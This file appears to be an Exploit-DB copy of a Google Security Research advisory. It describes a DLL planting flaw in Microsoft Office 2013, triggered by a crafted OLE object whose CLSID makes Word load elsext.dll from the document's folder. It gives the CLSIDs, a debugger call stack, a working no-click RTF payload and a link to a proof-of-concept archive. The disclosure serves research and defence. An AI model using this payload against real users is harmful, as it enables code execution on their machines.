@@ -1,0 +1,48 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=514
+
+It is possible for an attacker to execute a DLL planting attack in Microsoft Office with a specially crafted OLE object. Testing was performed on a Windows 7 x64 virtual machine with Office 2013 installed and the latest updates applied. The attached POC document "planted.doc" contains what was originally an embedded Packager object. The CLSID for this object was changed at offset 0x2650 to be {394c052e-b830-11d0-9a86-00c04fd8dbf7} (formatted as pack(">IHHBBBBBBBB")) which is one of several registered objects that have an InProcServer32 of els.dll. Other options include: {975797fc-4e2a-11d0-b702-00c04fd8dbf7} and {f778c6b4-c08b-11d2-976c-00c04f79db19}. When a user opens this document and single clicks on the icon for foo.txt ole32!OleLoad is invoked on our vulnerable CLSID. This results in a call to els!DllGetClassObject() which does a LoadLibraryW() call for elsext.dll (and riched32.dll but that's already loaded in winword.exe). If the attached elsext.dll is placed in the same directory with the planted.doc file you should see a popup coming from this DLL being loaded from the current working directory of Word.
+
+Here is the call stack leading up to the vulnerable LoadLibraryW() call. Also, it appears there are private symbols for ole32.dll on the public symbol server again. 
+
+0:000> kb
+ChildEBP RetAddr  Args to Child              
+005982a4 60e94cca 60e92464 9582fa74 00000000 kernel32!LoadLibraryW
+00598538 60e94d71 00000000 0059857c 60ea3209 els!WinbaseIsolationAwarePrivatetRgzlnPgpgk+0x1a8
+00598544 60ea3209 00598560 9582fa30 00000000 els!IsolationAwarePrivatenPgViNgRzlnPgpgk+0x30
+0059857c 60ea36b6 9582f680 60ea6d20 007cbfe8 els!IsolationAwareInitCommonControls+0x28
+005989cc 60e933d1 60e94377 0360ac4c 60ea6ce1 els!InitGlobals+0x2c3
+005989d0 60e94377 0360ac4c 60ea6ce1 005990a4 els!CDll::AddRef+0xe
+005989d8 60ea6ce1 005990a4 036087e0 00000000 els!CComponentDataCF::CComponentDataCF+0x10
+005989ec 75bbaec6 0360ac3c 75bbee84 00598a94 els!DllGetClassObject+0x77
+00598a08 75b991cd 0360ac3c 75bbee84 00598a94 ole32!CClassCache::CDllPathEntry::DllGetClassObject+0x30 [d:\w7rtm\com\ole32\com\objact\dllcache.cxx @ 3324]
+00598a20 75b98e92 00598a34 75bbee84 00598a94 ole32!CClassCache::CDllFnPtrMoniker::BindToObjectNoSwitch+0x1f [d:\w7rtm\com\ole32\com\objact\dllcache.cxx @ 3831]
+00598a58 75b98c37 00598a9c 00000000 005990a4 ole32!CClassCache::GetClassObject+0x49 [d:\w7rtm\com\ole32\com\objact\dllcache.cxx @ 4582]
+00598ad4 75bb3170 75cb6444 00000000 005990a4 ole32!CServerContextActivator::CreateInstance+0x110 [d:\w7rtm\com\ole32\com\objact\actvator.cxx @ 974]
+00598b14 75b98daa 005990a4 00000000 00599614 ole32!ActivationPropertiesIn::DelegateCreateInstance+0x108 [d:\w7rtm\com\ole32\actprops\actprops.cxx @ 1917]
+00598b68 75b98d1f 75cb646c 00000000 005990a4 ole32!CApartmentActivator::CreateInstance+0x112 [d:\w7rtm\com\ole32\com\objact\actvator.cxx @ 2268]
+00598b88 75b98aa2 75cb6494 00000001 00000000 ole32!CProcessActivator::CCICallback+0x6d [d:\w7rtm\com\ole32\com\objact\actvator.cxx @ 1737]
+00598ba8 75b98a53 75cb6494 00598f00 00000000 ole32!CProcessActivator::AttemptActivation+0x2c [d:\w7rtm\com\ole32\com\objact\actvator.cxx @ 1630]
+00598be4 75b98e0d 75cb6494 00598f00 00000000 ole32!CProcessActivator::ActivateByContext+0x4f [d:\w7rtm\com\ole32\com\objact\actvator.cxx @ 1487]
+00598c0c 75bb3170 75cb6494 00000000 005990a4 ole32!CProcessActivator::CreateInstance+0x49 [d:\w7rtm\com\ole32\com\objact\actvator.cxx @ 1377]
+00598c4c 75bb2ef4 005990a4 00000000 00599614 ole32!ActivationPropertiesIn::DelegateCreateInstance+0x108 [d:\w7rtm\com\ole32\actprops\actprops.cxx @ 1917]
+00598eac 75bb3170 75cb6448 00000000 005990a4 ole32!CClientContextActivator::CreateInstance+0xb0 [d:\w7rtm\com\ole32\com\objact\actvator.cxx @ 685]
+00598eec 75bb3098 005990a4 00000000 00599614 ole32!ActivationPropertiesIn::DelegateCreateInstance+0x108 [d:\w7rtm\com\ole32\actprops\actprops.cxx @ 1917]
+005996c8 75bb9e25 005997e4 00000000 00000403 ole32!ICoCreateInstanceEx+0x404 [d:\w7rtm\com\ole32\com\objact\objact.cxx @ 1334]
+00599728 75bb9d86 005997e4 00000000 00000403 ole32!CComActivator::DoCreateInstance+0xd9 [d:\w7rtm\com\ole32\com\objact\immact.hxx @ 343]
+0059974c 75bb9d3f 005997e4 00000000 00000403 ole32!CoCreateInstanceEx+0x38 [d:\w7rtm\com\ole32\com\objact\actapi.cxx @ 157]
+0059977c 75bd154c 005997e4 00000000 00000403 ole32!CoCreateInstance+0x37 [d:\w7rtm\com\ole32\com\objact\actapi.cxx @ 110]
+005997f8 75bcf2af 394c052e 11d0b830 c000869a ole32!wCreateObject+0x106 [d:\w7rtm\com\ole32\ole232\base\create.cpp @ 3046]
+0059985c 75bcf1d4 16260820 00000000 5f7a6600 ole32!OleLoadWithoutBinding+0x9c [d:\w7rtm\com\ole32\ole232\base\create.cpp @ 1576]
+00599884 703bca10 16260820 5f7a6600 097b2f00 ole32!OleLoad+0x37 [d:\w7rtm\com\ole32\ole232\base\create.cpp @ 1495]
+WARNING: Stack unwind information not available. Following frames may be wrong.
+005998f8 5fb7efb2 16260820 5f7a6600 097b2f00 mso!Ordinal4743+0x7c
+00599948 5fb7eeb9 09775da8 16260820 5f7a6600 wwlib!DllGetLCID+0x3bc330
+
+It is also possible to trigger this DLL load without a user click with the following RTF document:
+
+{\rtf1{\object\objemb{\*\objclass None}{\*\oleclsid \'7b394c052e-b830-11d0-9a86-00c04fd8dbf7\'7d}{\*\objdata 010500000100000001000000000000000000000000000000000000000000000000000000000000000000000000}}}
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/38918.zip
+
